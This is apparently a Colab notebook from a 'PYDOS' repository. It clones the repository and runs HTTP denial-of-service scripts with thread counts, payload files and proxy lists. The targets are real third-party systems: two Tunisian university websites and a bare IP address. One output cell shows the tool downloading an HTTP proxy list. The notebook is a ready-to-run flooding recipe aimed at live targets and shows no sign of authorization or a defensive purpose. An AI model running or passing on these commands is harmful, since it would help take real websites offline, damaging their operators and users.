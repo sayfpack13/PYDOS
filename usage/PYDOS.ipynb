{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!rm -r PYDOS\n",
        "!git clone https://github.com/sayfpack13/PYDOS\n",
        "!pip install -r PYDOS/usage/requirements.txt"
      ],
      "metadata": {
        "id": "fmdt5GYeAW-A"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python PYDOS/http-dos.py -d PYDOS/payload.txt -t 100 -p https://flm.rnu.tn/fra/home"
      ],
      "metadata": {
        "id": "RqML6_paBLo4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python PYDOS/http-dos2.py -f PYDOS/proxy.txt -url http://www.uma.rnu.tn/index.php"
      ],
      "metadata": {
        "id": "ROxrec0_B_Pf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!python PYDOS/http-dos4.py GET 1 100 10 http://46.166.142.81"
      ],
      "metadata": {
        "id": "bVYowOO1DQND",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "aa5f558a-0bbb-4752-fadb-61f5f4213b6d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "File:  proxy.txt\n",
            "downloading HTTP proxy list...\n"
          ]
        }
      ]
    }
  ]
}